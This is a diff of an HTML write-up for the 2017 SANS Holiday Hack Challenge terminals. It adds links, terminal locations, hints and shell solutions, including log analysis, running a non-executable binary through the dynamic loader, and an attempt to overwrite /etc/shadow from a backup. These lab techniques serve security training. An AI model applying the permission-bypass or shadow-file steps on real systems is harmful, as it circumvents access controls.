@@ -243,7 +243,9 @@ for the JavaScript code in this tag.
 </li>
 <li><a href="#sec-7">Easter Eggs</a>
 <ul>
-<li><a href="#sec-7-1"><span class="todo TODO">TODO</span> List Easter Eggs here</a></li>
+<li><a href="#title">Easter Eggs</a></li>
+<li><a href="#sec-7-2">Wintered logo is based on the Wicked stage musical poster.</a></li>
+<li><a href="#sec-7-3">Short video is based on video intro to Rudolph the Red-Nosed Reindeer</a></li>
 </ul>
 </li>
 <li><a href="#sec-8"><span class="todo TODO">TODO</span> Misc</a>
@@ -1046,9 +1048,9 @@ We can use the following indicators to search any clues we're later provided wit
 </div><div id="outline-container-sec-5-1" class="outline-3">
 <h3 id="sec-5-1"><span class="todo TODO">TODO</span> Bumble's Bounce</h3>
 <div class="outline-text-3" id="text-5-1">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-1-1" name="sec-5-1-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-1-1" name="sec-5-1-1"></a>Bumbles Bounce</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-1-1-1" name="sec-5-1-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -1090,18 +1092,27 @@ Identifying the least-popular browser is your noteworthy goal.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-1-1-2" name="sec-5-1-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-<a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid</a>=&lt;UID&gt;
+From this game: <a href="https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a">https://2017.holidayhackchallenge.com/game/dbb44df8-af5e-4136-b72e-ebd9dfb32b4a</a>
 </p>
 
-<div class="figure">
-<p><img src="./images/terminal-location-bounce.png" alt="terminal-location-bounce.png" />
+<p>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=595aeb87-d3b2-41a3-b612-fa553a30e822&uid=USER_ID</a>
 </p>
-<p><span class="figure-number">Figure 4:</span> In-game location of terminal</p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-bounce.png" alt="terminal-location-bounce.png" />
+</p>
+<p><span class="figure-number">Figure 4:</span> The terminal is located at the top of the right hand hill.</p>
 </div>
 </div>
 </li>
 
-<li><a id="goal" name="goal"></a><a id="sec-5-1-1-3" name="sec-5-1-1-3"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-1-1-3" name="sec-5-1-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+</div>
+</li>
+
+<li><a id="goal" name="goal"></a><a id="sec-5-1-1-4" name="sec-5-1-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
 
 <p>
 The goal is to analyze a 'log file' and determine what the least popular browser.
@@ -1109,7 +1120,7 @@ The goal is to analyze a 'log file' and determine what the least popular browser
 </div>
 </li>
 
-<li><a id="hints" name="hints"></a><a id="sec-5-1-1-4" name="sec-5-1-1-4"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
+<li><a id="hints" name="hints"></a><a id="sec-5-1-1-5" name="sec-5-1-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
 
 <p>
 <a href="https://twitter.com/SirMintsALot">Minty Candycane on Twitter has some hints</a>
@@ -1125,7 +1136,7 @@ The goal is to analyze a 'log file' and determine what the least popular browser
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-1-1-5" name="sec-5-1-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-1-1-6" name="sec-5-1-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 A directory listing shows that terminal contains a binary called 'runtoanswer',
@@ -1134,14 +1145,14 @@ as well as fairly large 'access.log' file:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@a7b52ba8f7bc:~$ ls -lh
+<pre class="src src-sh">elf@784e43534178:~$ ls -lh
 total 29M
 -rw-r--r-- 1 root root  24M Dec  4 17:11 access.log
 -rwxr-xr-x 1 root root 5.0M Dec 11 17:31 runtoanswer
-elf@a7b52ba8f7bc:~$ wc -l access.log 
+elf@784e43534178:~$ wc -l access.log 
 98655 access.log
 
-elf@a7b52ba8f7bc:~$ head -n1 access.log 
+elf@784e43534178:~$ head -n1 access.log 
 XX.YY.66.201 - - [19/Nov/2017:06:50:30 -0500] <span style="font-style: italic;">"GET /robots.txt HTTP/1.1"</span> 301 185 <span style="font-style: italic;">"-"</span> <span style="font-style: italic;">"Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"</span>
 </pre>
 </div>
@@ -1158,7 +1169,7 @@ since we just want the user-agents, we can split the log lines on the double quo
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-1-1-6" name="sec-5-1-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-1-1-7" name="sec-5-1-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
 My solution is to use the cut tool, along with sort and uniq to find the least popular browser.
@@ -1168,11 +1179,11 @@ to use.  We just need to grab the right field.
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@a7b52ba8f7bc:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 4
+<pre class="src src-sh">elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 4
 -
-elf@a7b52ba8f7bc:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 5
+elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 5
 
-elf@a7b52ba8f7bc:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6
+elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6
 <span style="font-weight: bold;">Mozilla/5.0</span> (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)
 </pre>
 </div>
@@ -1184,7 +1195,7 @@ different versions of the same browser are merged:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@a7b52ba8f7bc:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1
+<pre class="src src-sh">elf@784e43534178:~$ head -n 1 access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1
 Mozilla
 </pre>
 </div>
@@ -1196,7 +1207,7 @@ standard `sort | uniq -c | sort -n` to grab a frequency
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@a7b52ba8f7bc:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1|sort|uniq -c|sort -n|tail -n 5
+<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1|sort|uniq -c|sort -n|tail -n 5
      33 slack
      34 Googlebot-Image
     143 -
@@ -1211,7 +1222,7 @@ Oops.. I mixed up the ordering, need the first 5, not the last 5:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@a7b52ba8f7bc:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1|sort|uniq -c|sort -n|head -n 5
+<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d / -f 1|sort|uniq -c|sort -n|head -n 5
       1 Dillo
       2 (KHTML, like Gecko) Chrome
       2 Slackbot-LinkExpanding 1.0 (+https:
@@ -1230,7 +1241,7 @@ I can also confirm that the log file only has a single entry for this user-agent
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@a7b52ba8f7bc:~$ grep Dillo access.log 
+<pre class="src src-sh">elf@784e43534178:~$ grep Dillo access.log 
 XX.YY.54.139 - - [27/Nov/2017:19:41:49 -0500] <span style="font-style: italic;">"GET /invoker/JMXInvokerServlet HTTP/1.1"</span> 301 185 <span style="font-style: italic;">"-"</span> <span style="font-style: italic;">"Dillo/3.0.5"</span>
 </pre>
 </div>
@@ -1241,7 +1252,7 @@ TODO: AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-1-1-7" name="sec-5-1-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-1-1-8" name="sec-5-1-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
 TODO: Any other, easier solutions?
@@ -1253,7 +1264,7 @@ We can RE the binary.
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-1-1-8" name="sec-5-1-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-1-1-9" name="sec-5-1-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 The most common issue appeared to be the result of not normalizing the different browser versions.
@@ -1262,7 +1273,7 @@ If you count each VERSION of a browser as a separate program, you will get a res
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@7ee187d61270:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|sort|uniq  -c|sort -n|head -n 5
+<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|sort|uniq  -c|sort -n|head -n 5
       1 Dillo/3.0.5
       1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
       1 Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko)
@@ -1277,7 +1288,7 @@ or like:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@7ee187d61270:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d <span style="font-style: italic;">' '</span> -f 1|sort|uniq  -c|sort -n
+<pre class="src src-sh">elf@784e43534178:~$ cat access.log |cut -d <span style="font-style: italic;">'"'</span> -f 6|cut -d <span style="font-style: italic;">' '</span> -f 1|sort|uniq  -c|sort -n
       1 Dillo/3.0.5
       1 curl/7.35.0
 </pre>
@@ -1285,7 +1296,7 @@ or like:
 </div>
 </li>
 
-<li><a id="loot" name="loot"></a><a id="sec-5-1-1-9" name="sec-5-1-1-9"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-1-1-10" name="sec-5-1-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
 
 <p>
 Anything interesting hidden on the system?
@@ -1298,9 +1309,9 @@ TODO: not that i know of
 <div id="outline-container-sec-5-2" class="outline-3">
 <h3 id="sec-5-2"><span class="todo TODO">TODO</span> Cryokinetic Magic</h3>
 <div class="outline-text-3" id="text-5-2">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-2-1" name="sec-5-2-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-2-1" name="sec-5-2-1"></a>Cryokinetic Magic</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-2-1-1" name="sec-5-2-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -1335,81 +1346,47 @@ Run the CandyCaneStriper executable to complete this challenge.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-2-1-2" name="sec-5-2-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal? What's the direct link to it?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02">https://2017.holidayhackchallenge.com/game/a1f7ac49-8210-436b-9e25-0c19f9ebfe02</a>
 </p>
+
+<p>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=da6d34d1-012b-420b-a7d5-369914353578&uid=USER_ID</a>
+</p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-cryokinetic.png" alt="terminal-location-cryokinetic.png" />
+</p>
+<p><span class="figure-number">Figure 5:</span> The terminal is on top of the ice shanty.</p>
+</div>
 </div>
 </li>
 
 <li><a id="background-information" name="background-information"></a><a id="sec-5-2-1-3" name="sec-5-2-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
-
-<p>
-Do we know anything about this terminal already?
-</p>
-
-<p>
-Hints:
-</p>
-
-<p>
-List any useful hints here.
-</p>
-
-<p>
-Blog Posts:
-</p>
-
-<p>
-Are any of these useful?
-</p>
-
-<ul class="org-ul">
-<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-(EC2)
-<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
-Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.
-</li>
-<li>Your Pokemon Guide for Essential SQL Pen Test Commands
-<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-</li>
-<li>Exploiting XXE Vulnerabilities in IIS/.NET
-<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML
-</li>
-<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
-<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
-Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
-</li>
-<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
-</li>
-<li>A Spot of Tee
-<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee
-</li>
-<li>Understanding and Exploiting Web-based LDAP
-<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection
-</li>
-<li>Massively Scaling your Scanning
-<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan
-</li>
-</ul>
 </div>
 </li>
 
 <li><a id="goal" name="goal"></a><a id="sec-5-2-1-4" name="sec-5-2-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
 
 <p>
-What are we trying to accomplish?
+We need to run the <code>CandyCaneStriper</code> program. Upon initial inspection we discover that <code>/usr/bin/chmod</code> is empty and <code>CandyCaneStriper</code> has no execution flags set.
 </p>
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-2-1-5" name="sec-5-2-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-2-1-5" name="sec-5-2-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
+
+<p>
+<a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/GreenesterElf/status/938542480487677952">Alright, who chmod -x'd and then removed chmod from my system? Not funny! I really need to run a program on this server, for serious. Was it you, @PepperyGoodness ? Weren't you mucking about with ARM64 recently?</a>
+</li>
+</ul>
+</div>
+</li>
+
+<li><a id="approach" name="approach"></a><a id="sec-5-2-1-6" name="sec-5-2-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 Describe the thought process that we tried here. How were we able to use
@@ -1418,19 +1395,31 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-2-1-6" name="sec-5-2-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-2-1-7" name="sec-5-2-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
-<p>
-Summarize the reference solution that we found.
-</p>
+<div class="org-src-container">
 
-<p>
-AsciiCinema video of the solution?
-</p>
+<pre class="src src-sh">elf@784e43534178:~$ /lib64/ld-linux-x86-64.so.2 ./CandyCaneStriper
+                   _..._
+                 <span style="font-weight: bold;">.</span><span style="font-style: italic;">'\\ //`,      </span>
+<span style="font-style: italic;">                /\\.'</span><span style="font-weight: bold;">``</span><span style="font-style: italic;">'.=",</span>
+<span style="font-style: italic;">               / \/     ;==|</span>
+<span style="font-style: italic;">              /\\/    .'\`</span>,<span style="font-weight: bold;">`</span>
+<span style="font-weight: bold;">             / \/     `</span><span style="font-style: italic;">""</span><span style="font-weight: bold;">`</span>
+<span style="font-weight: bold;">            /\\/</span>
+<span style="font-weight: bold;">           /\\/</span>
+<span style="font-weight: bold;">          /\ /</span>
+<span style="font-weight: bold;">         /\\/</span>
+<span style="font-weight: bold;">        /`</span><span style="font-style: italic;">\/</span>
+        <span style="font-style: italic;">\\</span>/
+         <span style="font-weight: bold;">`</span>
+<span style="font-weight: bold;">The candy cane striping machine is up and running!</span>
+</pre>
+</div>
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-2-1-7" name="sec-5-2-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-2-1-8" name="sec-5-2-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
 Any other, easier solutions?
@@ -1438,7 +1427,7 @@ Any other, easier solutions?
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-2-1-8" name="sec-5-2-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-2-1-9" name="sec-5-2-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 Do we know what issue(s) people were running into?
@@ -1446,7 +1435,7 @@ Do we know what issue(s) people were running into?
 </div>
 </li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-2-1-9" name="sec-5-2-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-2-1-10" name="sec-5-2-1-10"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
 
 <p>
 How was the challenge setup? Was there a better way to secure this
@@ -1455,7 +1444,7 @@ system?
 </div>
 </li>
 
-<li><a id="loot" name="loot"></a><a id="sec-5-2-1-10" name="sec-5-2-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-2-1-11" name="sec-5-2-1-11"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
 
 <p>
 Anything interesting hidden on the system?
@@ -1467,9 +1456,9 @@ Anything interesting hidden on the system?
 <div id="outline-container-sec-5-3" class="outline-3">
 <h3 id="sec-5-3"><span class="todo TODO">TODO</span> I Don't Think We're In Kansas Anymore</h3>
 <div class="outline-text-3" id="text-5-3">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-3-1" name="sec-5-3-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-3-1" name="sec-5-3-1"></a>I Don't Think We're In Kansas Anymore</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-3-1-1" name="sec-5-3-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -1511,12 +1500,19 @@ Identify the song whose popularity is the best.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-3-1-2" name="sec-5-3-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168">https://2017.holidayhackchallenge.com/game/5bbfc970-71d2-4c9d-816c-25955536c168</a>
 </p>
 
 <p>
-<a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID</a>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=ab13b9fc-6e7c-4477-a8a1-bca7b616b877&uid=USER_ID</a>
 </p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-kansas.png" alt="terminal-location-kansas.png" />
+</p>
+<p><span class="figure-number">Figure 6:</span> If you take away the poppies the terminal can easily be seen on the left hand side of the field.</p>
+</div>
 </div>
 </li>
 
@@ -1589,7 +1585,19 @@ What are we trying to accomplish?
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-3-1-5" name="sec-5-3-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-3-1-5" name="sec-5-3-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
+
+<p>
+<a href="https://twitter.com/ThePlumSweetest">Sugarplum Mary on Twitter has a hint</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/ThePlumSweetest/status/941067133898833921">Hey @PepperyGoodness, can you help me with an SQL problem I've seen? I think I need to do GROUP BY, but I'm not quite sure of the syntax.</a>
+</li>
+</ul>
+</div>
+</li>
+
+<li><a id="approach" name="approach"></a><a id="sec-5-3-1-6" name="sec-5-3-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 Describe the thought process that we tried here. How were we able to use
@@ -1598,7 +1606,7 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-3-1-6" name="sec-5-3-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-3-1-7" name="sec-5-3-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
 Summarize the reference solution that we found.
@@ -1610,7 +1618,7 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-3-1-7" name="sec-5-3-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-3-1-8" name="sec-5-3-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
 Any other, easier solutions?
@@ -1618,7 +1626,7 @@ Any other, easier solutions?
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-3-1-8" name="sec-5-3-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-3-1-9" name="sec-5-3-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 Do we know what issue(s) people were running into?
@@ -1626,7 +1634,7 @@ Do we know what issue(s) people were running into?
 </div>
 </li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-3-1-9" name="sec-5-3-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-3-1-10" name="sec-5-3-1-10"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
 
 <p>
 How was the challenge setup? Was there a better way to secure this
@@ -1635,7 +1643,7 @@ system?
 </div>
 </li>
 
-<li><a id="loot" name="loot"></a><a id="sec-5-3-1-10" name="sec-5-3-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-3-1-11" name="sec-5-3-1-11"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
 
 <p>
 Anything interesting hidden on the system?
@@ -1647,9 +1655,9 @@ Anything interesting hidden on the system?
 <div id="outline-container-sec-5-4" class="outline-3">
 <h3 id="sec-5-4"><span class="todo TODO">TODO</span> Oh Wait Maybe We Are</h3>
 <div class="outline-text-3" id="text-5-4">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-4-1" name="sec-5-4-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-4-1" name="sec-5-4-1"></a>Oh Wait! Maybe WE Are&#x2026;</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-4-1-1" name="sec-5-4-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -1684,12 +1692,19 @@ Hint: What commands can you run with sudo?
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-4-1-2" name="sec-5-4-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5">https://2017.holidayhackchallenge.com/game/f09180b7-43e4-406c-83ac-924539e7b8f5</a>
 </p>
 
 <p>
-<a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID</a>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=a9d07a00-55bc-4391-a02b-71f3c4f1ec44&uid=USER_ID</a>
 </p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-we_are.png" alt="terminal-location-we_are.png" />
+</p>
+<p><span class="figure-number">Figure 7:</span> The terminal is just behind the starting ramp on the main platform.</p>
+</div>
 </div>
 </li>
 
@@ -1727,14 +1742,38 @@ permissions to do that directly:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@40a64f5e12a2:~$ cp /etc/shadow.bak /etc/shadow
+<pre class="src src-sh">elf@784e43534178:~$ cp /etc/shadow.bak /etc/shadow
 cp: cannot create regular file <span style="font-style: italic;">'/etc/shadow'</span>: Permission denied
 </pre>
 </div>
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-4-1-5" name="sec-5-4-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-4-1-5" name="sec-5-4-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-approach">
+
+<p>
+<a href="https://twitter.com/ClimbALLdaTrees">Shinny Upatree on Twitter has a few hints</a>
+</p>
+<ul class="org-ul">
+<li>[[<a href="https://twitter.com/ClimbALLdaTrees/status/938578034113765376][You">https://twitter.com/ClimbALLdaTrees/status/938578034113765376][You</a> know that feeling when something horrible has happened? So I was editing /etc/shadow manually, and&#x2026; well:
+</li>
+</ul>
+<p>
+$ ls -l /etc/shadow
+-rw-rw-&#x2014; 1 root shadow 0 Dec  7 01:13 /etc/shadow
+</p>
+
+<p>
+@1Horse1OSSleigh tells me the "Non-default shadow group permissions" might help&#x2026;. okay?]
+</p>
+<ul class="org-ul">
